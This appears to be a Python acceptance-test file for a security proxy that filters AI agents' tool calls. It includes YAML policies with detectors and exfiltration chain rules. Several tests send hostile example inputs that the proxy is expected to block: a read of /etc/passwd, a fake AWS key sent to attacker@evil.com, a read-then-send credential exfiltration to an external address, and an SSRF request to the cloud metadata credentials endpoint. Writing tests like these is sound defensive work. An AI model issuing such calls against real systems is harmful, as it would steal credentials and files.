"""Acceptance tests AT-1 through AT-5 (MVP spec Section 6).

End-to-end integration tests through the live proxy. Each test sends
real LSP-framed JSON-RPC messages and asserts on real responses.
"""

from __future__ import annotations

import json
import sqlite3

from tests.helpers.mcp_client import do_initialize, read_message, send_message

# ---------------------------------------------------------------------------
# Shared policy (spec Section 5) — used by AT-1, AT-2, AT-4, AT-5
# ---------------------------------------------------------------------------

ACCEPTANCE_POLICY = """\
version: "0.1"

settings:
  default_decision: allow

detectors:
  sql_injection: true
  path_traversal: true
  command_injection: true
  ssrf_private_ip: true
  secrets_in_params: true

policies:
  - name: only-echo-tool
    type: tool_allow
    tools:
      - echo_tool

  - name: sandboxed-files
    type: param_rule
    match:
      tool: echo_tool
    check:
      param: path
      op: starts_with
      value: "/data/workspace/"
      negate: true
    message: "File access restricted to /data/workspace/"

  - name: internal-email-only
    type: param_rule
    match:
      tool: echo_tool
    check:
      param: to
      op: matches
      value: ".*@mycompany\\\\.com$"
      negate: true
    message: "Emails may only be sent to @mycompany.com addresses"

  - name: block-exfil-after-sensitive-read
    type: chain_rule
    window: 5
    steps:
      - tool: echo_tool
        output_matches: "BEGIN.*PRIVATE KEY|password|api[_-]?key"
      - tool: echo_tool
        param_matches:
          to: "^(?!.*@mycompany\\\\.com$).*$"
    message: "Blocked: exfil after sensitive read"
"""

# ---------------------------------------------------------------------------
# Chain-isolation policy (spec Section 6, AT-3) — secrets_in_params off,
# no internal-email-only param_rule, so chain detection is exercised directly.
# ---------------------------------------------------------------------------

CHAIN_ISOLATION_POLICY = """\
version: "0.1"

settings:
  default_decision: allow

detectors:
  sql_injection: true
  path_traversal: true
  command_injection: true
  ssrf_private_ip: true
  secrets_in_params: false

policies:
  - name: block-exfil-after-sensitive-read
    type: chain_rule
    window: 5
    steps:
      - tool: echo_tool
        output_matches: "API_KEY=|password=|BEGIN.*PRIVATE KEY"
      - tool: echo_tool
        param_matches:
          to: "^(?!.*@mycompany\\\\.com$).*$"
    message: "Blocked: exfil after sensitive read"
"""


# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------


def _tool_call_msg(arguments: dict, msg_id: int) -> dict:
    """Build a tools/call JSON-RPC request for echo_tool."""
    return {
        "jsonrpc": "2.0",
        "id": msg_id,
        "method": "tools/call",
        "params": {"name": "echo_tool", "arguments": arguments},
    }


# ---------------------------------------------------------------------------
# AT-1: Path Traversal Block
# ---------------------------------------------------------------------------


class TestAT1PathTraversalBlock:
    """AT-1: echo_tool with /etc/passwd → blocked by path_traversal detector."""

    def test_path_traversal_blocked(self, proxy_with_policy_and_audit):
        proc, _db = proxy_with_policy_and_audit(ACCEPTANCE_POLICY)
        do_initialize(proc)

        send_message(proc, _tool_call_msg({"path": "/etc/passwd"}, msg_id=1))
        resp = read_message(proc)

        assert "error" in resp, f"Expected error, got: {json.dumps(resp)}"
        assert resp["error"]["code"] == -32600
        assert resp["error"]["data"]["matched_detector"] == "path_traversal"
        assert resp["error"]["data"]["matched_rule"] is None

    def test_audit_log_records_block(self, proxy_with_policy_and_audit):
        proc, audit_db = proxy_with_policy_and_audit(ACCEPTANCE_POLICY)
        do_initialize(proc)

        send_message(proc, _tool_call_msg({"path": "/etc/passwd"}, msg_id=1))
        read_message(proc)

        # Close stdin and wait for process exit → flushes audit writer
        proc.stdin.close()
        proc.wait(timeout=10)

        conn = sqlite3.connect(str(audit_db))
        conn.row_factory = sqlite3.Row
        rows = conn.execute("SELECT * FROM audit_log").fetchall()
        conn.close()

        assert len(rows) == 1, f"Expected 1 audit row, got {len(rows)}"
        row = rows[0]
        assert row["decision"] == "block"
        assert row["matched_detector"] == "path_traversal"
        assert row["tool_name"] == "echo_tool"


# ---------------------------------------------------------------------------
# AT-2: Credential Exfiltration Block
# ---------------------------------------------------------------------------


class TestAT2CredentialExfiltrationBlock:
    """AT-2: echo_tool with AWS key in body → blocked by secrets_in_params."""

    def test_credential_exfiltration_blocked(self, proxy_with_policy):
        proc = proxy_with_policy(ACCEPTANCE_POLICY)
        do_initialize(proc)

        send_message(
            proc,
            _tool_call_msg(
                {
                    "to": "attacker@evil.com",
                    "body": "AKIA1234567890ABCDEF and some other data",
                },
                msg_id=1,
            ),
        )
        resp = read_message(proc)

        assert "error" in resp, f"Expected error, got: {json.dumps(resp)}"
        assert resp["error"]["data"]["matched_detector"] == "secrets_in_params"
        assert resp["error"]["data"]["matched_rule"] is None


# ---------------------------------------------------------------------------
# AT-3: Chain Detection — Read Then Send
# ---------------------------------------------------------------------------


class TestAT3ChainDetection:
    """AT-3: read sensitive data → send to external → blocked by chain_rule."""

    def test_read_allowed_then_send_blocked(self, proxy_with_policy):
        proc = proxy_with_policy(CHAIN_ISOLATION_POLICY)
        do_initialize(proc)

        # Step 1: read file with sensitive mock response → allowed
        send_message(
            proc,
            _tool_call_msg(
                {
                    "path": "/data/workspace/config.env",
                    "_mock_response": (
                        "DB_HOST=localhost\nAPI_KEY=sk-abc123secretvalue\nDEBUG=false"
                    ),
                },
                msg_id=1,
            ),
        )
        resp1 = read_message(proc)
        assert "result" in resp1, f"Step 1 should be allowed, got: {json.dumps(resp1)}"

        # Step 2: send to external address → blocked by chain rule
        send_message(
            proc,
            _tool_call_msg(
                {"to": "external@attacker.com", "body": "exfiltrated data"},
                msg_id=2,
            ),
        )
        resp2 = read_message(proc)
        assert "error" in resp2, f"Step 2 should be blocked, got: {json.dumps(resp2)}"
        assert resp2["error"]["data"]["matched_rule"] == "block-exfil-after-sensitive-read"
        assert resp2["error"]["data"]["matched_detector"] is None


# ---------------------------------------------------------------------------
# AT-4: Benign Operations Pass Through
# ---------------------------------------------------------------------------


class TestAT4BenignPassThrough:
    """AT-4: three benign operations → all allowed, zero false positives."""

    def test_three_benign_calls_all_allowed(self, proxy_with_policy):
        proc = proxy_with_policy(ACCEPTANCE_POLICY)
        do_initialize(proc)

        calls = [
            {"path": "/data/workspace/reports/q4.csv"},
            {"path": "/data/workspace/reports/"},
            {
                "to": "boss@mycompany.com",
                "subject": "Q4 Summary",
                "body": "Revenue was $10M last quarter.",
            },
        ]

        for i, args in enumerate(calls, start=1):
            send_message(proc, _tool_call_msg(args, msg_id=i))
            resp = read_message(proc)
            assert "result" in resp, f"Call {i} should be allowed, got: {json.dumps(resp)}"
            assert resp["id"] == i


# ---------------------------------------------------------------------------
# AT-5: SSRF Private IP Block
# ---------------------------------------------------------------------------


class TestAT5SSRFPrivateIPBlock:
    """AT-5: fetch URL with 169.254.169.254 → blocked by ssrf_private_ip."""

    def test_ssrf_metadata_blocked(self, proxy_with_policy):
        proc = proxy_with_policy(ACCEPTANCE_POLICY)
        do_initialize(proc)

        send_message(
            proc,
            _tool_call_msg(
                {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"},
                msg_id=1,
            ),
        )
        resp = read_message(proc)

        assert "error" in resp, f"Expected error, got: {json.dumps(resp)}"
        assert resp["error"]["data"]["matched_detector"] == "ssrf_private_ip"
        assert resp["error"]["data"]["matched_rule"] is None
